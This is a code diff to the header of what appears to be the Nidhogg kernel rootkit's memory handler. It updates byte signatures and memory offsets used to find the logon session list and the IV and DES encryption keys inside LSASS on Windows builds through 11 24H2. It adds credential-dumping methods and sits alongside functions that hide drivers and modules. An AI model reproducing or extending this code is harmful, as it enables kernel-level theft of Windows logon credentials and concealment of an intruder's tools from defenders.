@@ -35,8 +35,8 @@ constexpr UCHAR LogonSessionListPattern24H2[] = { 0xCC, 0xC1, 0xCC, 0x04 };
 constexpr UCHAR LogonSessionListPattern23H2[] = { 0x33, 0xC0, 0x48, 0x8D };
 constexpr Pattern LogonSessionListPatterns[] = {
 	{{WIN_1507, WIN_20H2}, sizeof(LogonSessionListPattern24H2), LogonSessionListPattern24H2, 0xCC, 7, false},
-	{{WIN_11_24H2, WIN_11_24H2}, sizeof(LogonSessionListPattern24H2), LogonSessionListPattern24H2, 0xCC, -5, false},
-	{{WIN_21H1, WIN_11_23H2}, sizeof(LogonSessionListPattern23H2), LogonSessionListPattern23H2, 0xCC, 5, false}
+	{{WIN_21H1, WIN_11_23H2}, sizeof(LogonSessionListPattern23H2), LogonSessionListPattern23H2, 0xCC, 5, false},
+	{{WIN_11_24H2, WIN_11_24H2}, sizeof(LogonSessionListPattern24H2), LogonSessionListPattern24H2, 0xCC, -4, false}
 };
 constexpr SIZE_T LogonSessionListPatternCount = sizeof(LogonSessionListPatterns) / sizeof(Pattern);
 
@@ -51,7 +51,14 @@ constexpr Pattern LogonSessionListCountPatterns[] = {
 
 constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
 constexpr Pattern IvSignaturePattern = {
-	{WIN_1507, WIN_11_24H2}, sizeof(IvSignature), IvSignature, 0xCC, 6, false
+	{WIN_1507, WIN_11_24H2}, 
+	sizeof(IvSignature), 
+	IvSignature, 
+	0xCC, 
+	6, 
+	false,
+	1,
+	{WIN_11_24H2, WIN_11_24H2, 10}
 };
 constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
 constexpr Pattern DesKeySignaturePattern = {
@@ -60,7 +67,8 @@ constexpr Pattern DesKeySignaturePattern = {
 constexpr SIZE_T DesKeyStructOffset = 0xB;
 constexpr SIZE_T LsaInitializeProtectedMemoryDistance = 0x310;
 constexpr SIZE_T LogonSessionListDistance = 0x310;
-constexpr SIZE_T IvDesKeyLocationDistance = 0x82A6F;
+constexpr SIZE_T IvDesKeyLocationDistance = 0xAAFB0;
+constexpr ULONG IV_DEFAULT_SIZE = 8;
 
 struct PebLinks {
 	LIST_ENTRY InLoadOrderLinks;
@@ -97,6 +105,7 @@ struct LsassInformation {
 	KeyInformation DesKey;
 	KeyInformation Iv;
 	SIZE_T Count;
+	IoctlCredentialsSize* AllocationSize;
 	IoctlCredentials* Creds;
 };
 
@@ -156,7 +165,7 @@ private:
 	NTSTATUS RestoreModule(_In_ HiddenModuleEntry* moduleEntry);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS GetLsassMetadata(_Inout_ PEPROCESS& lsass);
+	NTSTATUS GetLsassMetadata(_In_ ULONG lsassPid);
 
 public:
 	void* operator new(size_t size) {
@@ -210,10 +219,13 @@ public:
 	NTSTATUS UnhideDriver(_In_ wchar_t* driverPath);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS DumpCredentials(_Out_ SIZE_T* allocationSize);
+	NTSTATUS DumpCredentials(_Out_ IoctlCredentialsInfoSize* allocationSize);
 
 	_IRQL_requires_max_(APC_LEVEL)
 	NTSTATUS GetCredentials(_Inout_ IoctlCredentialsInformation* credentials);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS GetCredentialsSize(_Inout_ IoctlCredentialsSize* credentialsSize);
 };
 
 inline MemoryHandler* NidhoggMemoryHandler;
